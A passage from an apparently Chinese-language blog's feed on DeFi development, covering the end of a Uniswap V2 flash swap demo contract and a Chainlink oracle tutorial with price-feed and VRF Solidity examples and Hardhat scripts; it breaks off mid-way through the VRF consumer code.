0xc5697643c5d76F7ea252eF911171d9cbbEe359ec;</span><br><span class="line">    address private constant USDT = 0xccCDC0B397B2D6fb3717C13738f8865AaC5A2B9C;</span><br><span class="line">    address private constant MYTOKEN = 0x7241CBC94A6f76D6eFF7fea6Fd141284338F8e46;</span><br><span class="line">    address private constant PAIR = 0xfb85b7DedCFcea3f4fe6894931c0fA75A1ef7844;</span><br><span class="line">    address private constant FACTORY = 0xd7330EdCd8665C0369606d2B07E13EBE1f4319c7;</span><br><span class="line"></span><br><span class="line">    event Log(string message, uint256 val);</span><br><span class="line">    </span><br><span class="line">    //借100USDT</span><br><span class="line">    function loanFlashSwap(address _usdtBorrow, uint256 _amount) external &#123;</span><br><span class="line"></span><br><span class="line">        address token0 = IUniswapV2Pair(PAIR).token0();</span><br><span class="line">        address token1 = IUniswapV2Pair(PAIR).token1();</span><br><span class="line">        uint256 amount0Out = _usdtBorrow == token0 ? _amount : 0;</span><br><span class="line">        uint256 amount1Out = _usdtBorrow == token1 ? _amount : 0;</span><br><span class="line">        bytes memory data = abi.encode(_usdtBorrow, _amount);</span><br><span class="line"></span><br><span class="line">        IUniswapV2Pair(PAIR).swap(amount0Out, amount1Out, address(this), data);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    function uniswapV2Call(address _sender, uint _amount0, uint _amount1, bytes calldata _data ) external override &#123;</span><br><span class="line">        </span><br><span class="line">        address token0 = IUniswapV2Pair(msg.sender).token0();</span><br><span class="line">        address token1 = IUniswapV2Pair(msg.sender).token1();</span><br><span class="line">        address pair = IUniswapV2Factory(FACTORY).getPair(token0, token1);</span><br><span class="line">        require(msg.sender == pair, &quot;!pair&quot;);</span><br><span class="line">        require(_sender == address(this), &quot;!sender&quot;);</span><br><span class="line"></span><br><span class="line">        (address usdtBorrow, uint amount) = abi.decode(_data, (address, uint));</span><br><span class="line">        // 加上利息 0.3%</span><br><span class="line">        uint fee = ((amount * 3) / 997) + 1;</span><br><span class="line">        uint amountToRepay = amount + fee;</span><br><span class="line"></span><br><span class="line">        //执行我们的业务逻辑</span><br><span class="line">        emit Log(&quot;amount&quot;, amount);</span><br><span class="line">        emit Log(&quot;amount0&quot;, _amount0);</span><br><span class="line">        emit Log(&quot;amount1&quot;, _amount1);</span><br><span class="line">        emit Log(&quot;fee&quot;, fee);</span><br><span class="line">        emit Log(&quot;amount to repay&quot;, amountToRepay);</span><br><span class="line">        </span><br><span class="line">        //把借来的Token还回去</span><br><span class="line">        IERC20(usdtBorrow).transfer(pair, amountToRepay);</span><br><span class="line">   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 03.Uniswap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>06.Chainlink_oracle</title>
      <link href="/2024/04/14/12.DeFi/06.Chainlink_oracle/"/>
      <url>/2024/04/14/12.DeFi/06.Chainlink_oracle/</url>
      
        <content type="html"><![CDATA[<h1 id="Chainlink-oracle"><a href="#Chainlink-oracle" class="headerlink" title="Chainlink_oracle"></a>Chainlink_oracle</h1><h2 id="预言机"><a href="#预言机" class="headerlink" title="预言机"></a>预言机</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><ul><li>定义：智能合约无法获取区块链以外的数据，它是一个沙盒，外部API提供的数据和任何其他链下资源都无法获取。那么，预言机就充当这个角色：将真实世界的数据输送到智能合约中<ul><li>例子1：用户在质押平台质押了代币，那么平台就需要知道代币的价格，而价格无法在链上获取，需要从外部输入。</li><li>例子2：保险公司说如果明天下雨，则赔偿给你，而明天下不下雨这件事，需要从外部输入</li></ul></li><li>由于区块链的节点之间，执行程序的结果都是相同的，因此不存在随机这个东西，否则无法达到共识。比如：生成随机数的函数，这是不存在的，只能是伪随机数。并且合约主动获取链下数据存在API不稳定、URL更新等一系列问题，因此必须有一个第三方合约来主动给合约来提供链下数据</li></ul><h3 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h3><p><strong>中心化预言机</strong></p><p>运行一个中心化节点，然后提供数据给合约。</p><p><img src="/2024/04/14/12.DeFi/06.Chainlink_oracle/image-20230807213044503.png" alt="image-20230807213044503"></p><p>问题：单点失败。如果整个区块链的信息依赖于某个节点，如果这个节点挂了，那么整个区块链数据就无法获取了</p><p><strong>去中心化预言机</strong></p><p>多个数据节点形成去中心预言机网络，每个节点都会收集数据，达成共识（聚合）后输入到区块链上的智能合约。达成公式：比如取中位数、平均数等</p><ol><li>技术上，避免了单点失败风险</li><li>数据上，通过网络对多个数据源进行验证</li></ol><p>chainlink就搞了一个这样的去中心化预言机网络，提供喂价、随机数等等，目前chainlink的共识机制是取中位数</p><h2 id="喂价"><a href="#喂价" class="headerlink" title="喂价"></a>喂价</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul><li>喂价：Chainlink Data Fee</li></ul><p><img src="/2024/04/14/12.DeFi/06.Chainlink_oracle/image-20230807213640925.png" alt="image-20230807213640925"></p><ul><li>业务流程图：数据提供商和预言机节点是不一样的，数据提供商只负责收集数据，预言机节点会和其他节点聚合数据，达成共识</li></ul><p><img src="/2024/04/14/12.DeFi/06.Chainlink_oracle/image-20230807213821074.png" alt="image-20230807213821074"></p><ul><li>技术架构</li></ul><p><img src="/2024/04/14/12.DeFi/06.Chainlink_oracle/image-20230807214057548.png" alt="image-20230807214057548"></p><ul><li>使用chainlink预言机的项目</li></ul><p><img src="/2024/04/14/12.DeFi/06.Chainlink_oracle/image-20230807214144131.png" alt="image-20230807214144131"></p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>获得币对地址：<a href="https://docs.chain.link/data-feeds/price-feeds/addresses">https://docs.chain.link/data-feeds/price-feeds/addresses</a></p><h4 id="remix"><a href="#remix" class="headerlink" title="remix"></a>remix</h4><p>使用solidity获得goerli测试网中币对的价格</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.21;</span><br><span class="line"></span><br><span class="line">// Proxy的接口</span><br><span class="line">import &quot;@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract PriceFeed&#123;</span><br><span class="line">    AggregatorV3Interface internal priceFeed;</span><br><span class="line"></span><br><span class="line">    constructor()&#123;</span><br><span class="line">        priceFeed = AggregatorV3Interface(0x779877A7B0D9E8603169DdbD7836e478b4624789);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getPrice() public view returns (int256)&#123;</span><br><span class="line">        // latestRoundData() returns</span><br><span class="line">        // uint80 roundId, // 价格的更新是一轮一轮的，每次更新+1</span><br><span class="line">        // int256 answer, // 价格数据</span><br><span class="line">        // uint256 startedAt, // 这个价格什么时候开始更新</span><br><span class="line">        // uint256 updatedAt, // 这个价格什么时候结束</span><br><span class="line">        // uint80 answeredInRound // 这个价格在第几轮更新</span><br><span class="line">        (,int256 answer,,,) = priceFeed.latestRoundData(); </span><br><span class="line">        return answer; // BTC/ETH价格 = 15962257405504495000</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="hardhat"><a href="#hardhat" class="headerlink" title="hardhat"></a>hardhat</h4><ol><li>npm init -yes</li><li>npm install —save-dev hardhat</li><li>npx hardhat init：选择空的</li><li>安装依赖：<ol><li>npm install —save-dev @chainlink/contracts</li><li>npm install —save-dev chai-bn</li><li>pm install —save-dev @nomicfoundation/hardhat-toolbox</li></ol></li></ol><p>DataFeedDemo.sol</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.19;</span><br><span class="line"></span><br><span class="line">// Proxy的接口</span><br><span class="line">import &quot;@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract DataFeedDemo&#123;</span><br><span class="line">    AggregatorV3Interface internal priceFeed;</span><br><span class="line"></span><br><span class="line">    constructor()&#123;</span><br><span class="line">        // https://docs.chain.link/data-feeds/price-feeds/addresses</span><br><span class="line">        priceFeed = AggregatorV3Interface(0x779877A7B0D9E8603169DdbD7836e478b4624789);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getPrice() public view returns (int256)&#123;</span><br><span class="line">        // latestRoundData() returns</span><br><span class="line">        // uint80 roundId, // 价格的更新是一轮一轮的，每次更新+1</span><br><span class="line">        // int256 answer, // 价格数据</span><br><span class="line">        // uint256 startedAt, // 这个价格什么时候开始更新</span><br><span class="line">        // uint256 updatedAt, // 这个价格什么时候结束</span><br><span class="line">        // uint80 answeredInRound // 这个价格在第几轮更新</span><br><span class="line">        (,int256 answer,,,) = priceFeed.latestRoundData(); </span><br><span class="line">        return answer; // BTC/ETH价格 = 15962257405504495000</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>deployDataFeed.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">&quot;hardhat&quot;</span>) <span class="comment">// ethers封装在hardhat里面</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">deployDataFeed</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">DataFeed</span> = <span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&quot;DataFeedDemo&quot;</span>)</span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">DataFeedContract</span> = <span class="keyword">await</span> <span class="title class_">DataFeed</span>.<span class="title function_">deploy</span>()</span><br><span class="line">    <span class="keyword">await</span> <span class="title class_">DataFeedContract</span>.<span class="title function_">waitForDeployment</span>()</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;the contract is deployed successfully&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> dataFeedContractAddr = <span class="title class_">DataFeedContract</span>.<span class="property">target</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;address of the contract is:&quot;</span> + dataFeedContractAddr)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">deployDataFeed</span>().<span class="title function_">then</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    process.<span class="title function_">exit</span>(<span class="number">0</span>)</span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(err)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>DataFeedDemo.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">&quot;hardhat&quot;</span>) <span class="comment">// ethers封装在hardhat里面</span></span><br><span class="line"><span class="keyword">const</span> &#123; expect &#125; = <span class="built_in">require</span>(<span class="string">&quot;chai&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="title function_">describe</span>(<span class="string">&quot;Data Feed Demo test&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">it</span>(<span class="string">&quot;check if the price data return by oracle is greater than 0&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// 部署合约</span></span><br><span class="line">        <span class="keyword">const</span> <span class="title class_">DataFeed</span> = <span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&quot;DataFeedDemo&quot;</span>)</span><br><span class="line">        <span class="keyword">const</span> <span class="title class_">DataFeedContract</span> = <span class="keyword">await</span> <span class="title class_">DataFeed</span>.<span class="title function_">deploy</span>()</span><br><span class="line">        <span class="keyword">await</span> <span class="title class_">DataFeedContract</span>.<span class="title function_">waitForDeployment</span>()</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;the contract is deployed successfully&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获得价格数据</span></span><br><span class="line">        <span class="keyword">const</span> result = <span class="keyword">await</span> <span class="title class_">DataFeedContract</span>.<span class="title function_">getPrice</span>()</span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;the price is :&quot;</span> + ethers.<span class="title function_">formatUnits</span>(result, <span class="string">&quot;ether&quot;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查数据是否正常</span></span><br><span class="line">        <span class="title function_">expect</span>(result).<span class="property">to</span>.<span class="property">be</span>.<span class="title function_">greaterThan</span>(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">        </span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>hardhat.config.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** <span class="doctag">@type</span> import(&#x27;hardhat/config&#x27;).HardhatUserConfig */</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;@nomicfoundation/hardhat-toolbox&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> privatekey = <span class="string">&quot;xxx&quot;</span></span><br><span class="line"><span class="keyword">const</span> goerliapi = <span class="string">&quot;https://eth-goerli.g.alchemy.com/v2/xxx&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">solidity</span>: <span class="string">&quot;0.8.19&quot;</span>,</span><br><span class="line">  <span class="attr">networks</span>: &#123;</span><br><span class="line">    <span class="attr">goerli</span>: &#123;</span><br><span class="line">      <span class="attr">accounts</span>: [privatekey],</span><br><span class="line">      <span class="attr">url</span>: goerliapi,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>package.json</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;datafeeddemo&quot;</span>,</span><br><span class="line">  <span class="string">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">  <span class="string">&quot;description&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="string">&quot;main&quot;</span>: <span class="string">&quot;index.js&quot;</span>,</span><br><span class="line">  <span class="string">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;test&quot;</span>: <span class="string">&quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;keywords&quot;</span>: [],</span><br><span class="line">  <span class="string">&quot;author&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="string">&quot;license&quot;</span>: <span class="string">&quot;ISC&quot;</span>,</span><br><span class="line">  <span class="string">&quot;devDependencies&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;@chainlink/contracts&quot;</span>: <span class="string">&quot;^0.6.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;@nomicfoundation/hardhat-toolbox&quot;</span>: <span class="string">&quot;^3.0.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;chai-bn&quot;</span>: <span class="string">&quot;^0.3.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hardhat&quot;</span>: <span class="string">&quot;^2.17.1&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="VRF"><a href="#VRF" class="headerlink" title="VRF"></a>VRF</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><ul><li><p>随机数生成器(RNG)-链上方案：挑选新生成的n个区块，计算他们的hash作为随机数。但某种程度上可被矿工控制，不可行。</p></li><li><p>随机数生成器(RNG)-预言机：链下预言机生成，随机数需要被证明因此需要Proof进行验证（验证是否通过约定的随机算法生成，种子是不是当时链上的随机数hash），虽然随机数也是跟区块hash有关，但是矿工无法提前预知</p></li></ul><p><img src="/2024/04/14/12.DeFi/06.Chainlink_oracle/image-20230808141723068.png" alt="image-20230808141723068"></p><ul><li>可验证随机数（VRF）定义<ul><li>可证明性：验证者要查看chainlink没有作弊</li><li>独特性：一个种子对应一个输出，chainlink无法选择一个对自己有利的输出</li><li>伪随机性：数学算法</li></ul></li></ul><p>随机数算法VRF（90年代提出的密码学算法，论文内容）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1.密钥生成函数(Key Gen)</span><br><span class="line">G(r) = (PK,SK)</span><br><span class="line">    PK: public key</span><br><span class="line">    SK: secret key</span><br><span class="line"># chainlink生成一个新的账户，用私钥来操作，把公钥写在合约变量中</span><br><span class="line"></span><br><span class="line">2.随机数生达函数(Evaluate)</span><br><span class="line">E(SK,seed)=&gt;(Randomness,Proof)</span><br><span class="line">    seed: RNG的种子</span><br><span class="line">    Randomness: 随机数</span><br><span class="line">    Proof: 证明</span><br><span class="line"></span><br><span class="line">3.验证函数(Verify)</span><br><span class="line">V(PK,seed,Randomness,Proff) =&gt; (True or false)</span><br></pre></td></tr></table></figure><ul><li>业务流程</li></ul><p><img src="/2024/04/14/12.DeFi/06.Chainlink_oracle/image-20230808142813601.png" alt="image-20230808142813601"></p><ul><li>技术架构<ol><li>用户调用自己创建的Consumer合约的函数请求随机数，用户创建的合约需要实现<code>RequestRandomWords()</code>和<code>FulfillRandomWords()</code></li><li>Consumer合约进一步调用Coordinator函数请求随机数</li><li>将PreSeed写入Event log</li><li>预言机读取Event log中的Preseed和blockhash</li><li>预言机通过VRF生成随机数和Proof</li><li>预言机将rc和proof写入Coordinator</li><li>Coordinator进行验证&amp;将随机数写入Consumer合约</li></ol></li></ul><p><img src="/2024/04/14/12.DeFi/06.Chainlink_oracle/image-20230808143033968.png" alt="image-20230808143033968"></p><ul><li>使用场景</li></ul><p><img src="/2024/04/14/12.DeFi/06.Chainlink_oracle/image-20230808143355734.png" alt="image-20230808143355734"></p><h3 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h3><p>步骤</p><ol><li>注册一个VRF，订阅它，告诉chainlink我们要用它的服务，并且可以查看随机数情况：<a href="https://vrf.chain.link/">https://vrf.chain.link/</a></li><li>将consumer合约（用户合约）加入到订阅</li><li>consumer合约请求随机数</li><li>consumer合约接收随机数</li></ol><p>合约地址：<a href="https://docs.chain.link/vrf/v2/direct-funding/supported-networks和https://docs.chain.link/vrf/v2/subscription/supported-networks">https://docs.chain.link/vrf/v2/direct-funding/supported-networks和https://docs.chain.link/vrf/v2/subscription/supported-networks</a></p><p>等待我们实现的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">abstract contract VRFConsumerBaseV2 &#123;</span><br><span class="line">  error OnlyCoordinatorCanFulfill(address have, address want);</span><br><span class="line">  address private immutable vrfCoordinator;</span><br><span class="line"></span><br><span class="line">  constructor(address _vrfCoordinator) &#123;</span><br><span class="line">    vrfCoordinator = _vrfCoordinator;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // 在我们的consumer合约需要实现这个方法</span><br><span class="line">  function fulfillRandomWords(uint256 requestId, uint256[] memory randomWords) internal virtual;</span><br><span class="line"></span><br><span class="line">  // Coordinator会回调这个方法进行写入</span><br><span class="line">  function rawFulfillRandomWords(uint256 requestId, uint256[] memory randomWords) external &#123;</span><br><span class="line">  // 查看调用者是不是vrfCoordinator</span><br><span class="line">    if (msg.sender != vrfCoordinator) &#123;</span><br><span class="line">      revert OnlyCoordinatorCanFulfill(msg.sender, vrfCoordinator);</span><br><span class="line">    &#125;</span><br><span class="line">    fulfillRandomWords(requestId, randomWords);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="remix-1"><a href="#remix-1" class="headerlink" title="remix"></a>remix</h4><p>获取subId</p><p><img src="/2024/04/14/12.DeFi/06.Chainlink_oracle/image-20230808151612289.png" alt="image-20230808151612289"></p><p><img src="/2024/04/14/12.DeFi/06.Chainlink_oracle/image-20230808151725617.png" alt="image-20230808151725617"></p><p><img src="/2024/04/14/12.DeFi/06.Chainlink_oracle/image-20230808151832779.png" alt="image-20230808151832779"></p><p><img src="/2024/04/14/12.DeFi/06.Chainlink_oracle/image-20230808152012937.png" alt="image-20230808152012937"></p><p>完成订阅，然后可以调用<code>requestRandomWords()</code>申请随机数</p><p><img src="/2024/04/14/12.DeFi/06.Chainlink_oracle/image-20230808152115900.png" alt="image-20230808152115900"></p><p>需要稍微等一下，我们才能查看到s_randomWords随机数数据（在此之前也可以可以查询到s_requestId）</p><p><img src="/2024/04/14/12.DeFi/06.Chainlink_oracle/image-20230808152300396.png" alt="image-20230808152300396"></p><p>成功</p><p><img src="/2024/04/14/12.DeFi/06.Chainlink_oracle/image-20230808154528133.png" alt="image-20230808154528133"></p><p>随机数很大，实际应用中可以取模操作使他变小</p><p><img src="/2024/04/14/12.DeFi/06.Chainlink_oracle/image-20230808154705208.png" alt="image-20230808154705208"></p><p>坑：<code>uint32 callbackGasLimit = 5_200_00;</code>设置太高或者太低都会失败。并且，如果你的link太少，Coordinator在回调的时候，无法成功，因此需要在页面中添加更多的link</p><p><img src="/2024/04/14/12.DeFi/06.Chainlink_oracle/image-20230808154544157.png" alt="image-20230808154544157"></p><p>代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.21;</span><br><span class="line"></span><br><span class="line">import &quot;@chainlink/contracts/src/v0.8/interfaces/VRFCoordinatorV2Interface.sol&quot;;</span><br><span class="line">import &quot;@chainlink/contracts/src/v0.8/VRFConsumerBaseV2.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract ChainlinkVRFDemo is VRFConsumerBaseV2&#123;</span><br><span class="line"></span><br><span class="line">    // 1.获取Coordinator的接口</span><br><span class="line">    VRFCoordinatorV2Interface COORDINATOR;</span><br><span class="line">    address vrfCoordinatorAddr = 0x2Ca8E0C643bDe4C2E08ab1fA0da3401AdAD7734D;</span><br><span class="line">    // 2.获取keyHash，服务质量</span><br><span class="line">    bytes32 keyHash = 0x79d3d8832d904592c0bf9818b621522c988bb8b0c05cdc3b15aea1b6e8db0c15;</span><br><span class="line">    // 3.订阅ID号</span><br><span class="line">    uint64 s_subId;</span><br><span class="line">    // 4.我们认为3个区块之后获取VRF,实验方便起见，选3</span><br><span class="line">    uint16 requestConfirmations = 3; </span><br><span class="line">    // 5.gas回调设置，太小会导致无法写入随机数</span><br><span class="line">    uint32 callbackGasLimit = 5_200_00; // 太高或太小都会fail</span><br><span class="line">    // 6.我们请求4个随机数</span><br><span class="line">    uint32 numWords = 4; </span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line">    // 7.第几轮的随机数</span><br><span class="line">    uint256 public s_requestId;</span><br><span class="line">    // 8.随机数结果</span><br><span class="line">    uint256[] public s_randomWords;</span><br><span class="line"></span><br><span class="line">    constructor(uint64 subId) VRFConsumerBaseV2(vrfCoordinatorAddr)&#123;</span><br><span class="line">        COORDINATOR = VRFCoordinatorV2Interface(vrfCoordinatorAddr);</span><br><span class="line">        s_subId = subId;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function requestRandomWords() public &#123;</span><br><span class="line">        // 我们给Coordinator发送请求，Coordinator又调用预言机节点返回随机数，预言机节点需要花费gas</span><br><span class="line">        // 因此gas不仅仅是调用者花费gas，预言机节点也会花费gas，因此做一点限制</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        // bytes32 keyHash, 其实就是公钥信息。不同的keyHash代表我支付不同的gas费用，比如我想要更好更快的，则选择质量更高的keyHash，服务商会提供你更好的服务</span><br><span class="line">        // uint64 subId, 订阅ID号</span><br><span class="line">        // uint16 requestConfirmations, 认为多少个区块之后能成功获取VRF，L1一般是12</span><br><span class="line">        // uint32 callbackGasLimit, VRF调用我们的fulfillrandomWords()时使用的gas上限</span><br><span class="line">        // uint32 numWords 请求多少个随机数，目前上限是500</span><br><span class="line">        // 返回一个requestID,告诉你是哪次请求的</span><br><span class="line">        // 9.请求随机数</span><br><span class="line">        s_requestId = COORDINATOR.requestRandomWords(keyHash, s_subId, requestConfirmations, callbackGasLimit, 